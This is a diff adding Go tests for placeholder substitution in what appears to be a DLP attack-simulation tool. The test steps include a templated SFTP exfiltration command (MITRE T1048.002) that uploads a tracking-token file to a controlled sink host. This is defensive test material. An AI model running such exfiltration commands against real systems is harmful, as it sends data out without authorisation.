@@ -210,3 +210,94 @@ func TestDNSServerHost_StripsSchemeAndPort(t *testing.T) {
 		}
 	}
 }
+
+func TestIssueSinkTokensAndSubstitute_SFTPPlaceholders(t *testing.T) {
+	if testing.Short() {
+		t.Skip("skipping container-backed test in -short mode")
+	}
+	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
+		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
+		steps := []scenario.ScenarioStep{
+			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
+		}
+		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-1", "https://orchestrator.example:9443", steps)
+		if err != nil {
+			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
+		}
+		cmd := out[0].Command
+		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SFTP_HOST}}") || strings.Contains(cmd, "{{SINK_SFTP_PORT}}") {
+			t.Fatalf("SFTP placeholders not fully substituted: %s", cmd)
+		}
+		if !strings.Contains(cmd, "orchestrator.example") {
+			t.Fatalf("expected the bare host in the command: %s", cmd)
+		}
+		if strings.Contains(cmd, "orchestrator.example:9443") {
+			t.Fatalf("SINK_SFTP_HOST must not include the port: %s", cmd)
+		}
+		if !strings.Contains(cmd, "2222") {
+			t.Fatalf("expected the default SINK_SFTP_PORT (2222) in the command: %s", cmd)
+		}
+
+		var tokenLen int
+		if err := pool.QueryRow(context.Background(),
+			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-1' AND technique_id = 'T1048.002'`,
+		).Scan(&tokenLen); err != nil {
+			t.Fatalf("query dlp_sink_tokens: %v", err)
+		}
+		if tokenLen != 64 {
+			t.Fatalf("token length = %d, want 64 (SFTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
+		}
+	})
+}
+
+func TestIssueSinkTokensAndSubstitute_SFTPDoesNotIssueOrphanedSecondToken(t *testing.T) {
+	// Regression: the SFTP placeholder block must NOT generate its own
+	// {{SINK_TOKEN}} -- every real SFTP-wired step's command contains
+	// {{SINK_TOKEN}} too (as the upload filename), which the existing
+	// unconditional first block already issues and substitutes. A second
+	// token issued here would never appear in the final command (a no-op
+	// ReplaceAll on text that no longer contains the placeholder) and
+	// would sit in dlp_sink_tokens as dead weight -- exactly one row must
+	// exist per run+technique, not two.
+	if testing.Short() {
+		t.Skip("skipping container-backed test in -short mode")
+	}
+	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
+		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
+		steps := []scenario.ScenarioStep{
+			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
+		}
+		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-orphan", "https://orchestrator.example:9443", steps); err != nil {
+			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
+		}
+		var count int
+		if err := pool.QueryRow(context.Background(),
+			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-orphan' AND technique_id = 'T1048.002'`,
+		).Scan(&count); err != nil {
+			t.Fatalf("query dlp_sink_tokens: %v", err)
+		}
+		if count != 1 {
+			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the SFTP block)", count)
+		}
+	})
+}
+
+func TestIssueSinkTokensAndSubstitute_SFTPHost_HonorsExplicitOverride(t *testing.T) {
+	if testing.Short() {
+		t.Skip("skipping container-backed test in -short mode")
+	}
+	t.Setenv("SINK_SFTP_HOST", "sftp-external.example.net")
+	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
+		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
+		steps := []scenario.ScenarioStep{
+			{TechniqueID: "T1048.002", Command: "target={{SINK_SFTP_HOST}}"},
+		}
+		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-2", "https://orchestrator.example:9443", steps)
+		if err != nil {
+			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
+		}
+		if !strings.Contains(out[0].Command, "sftp-external.example.net") {
+			t.Fatalf("expected the SINK_SFTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
+		}
+	})
+}
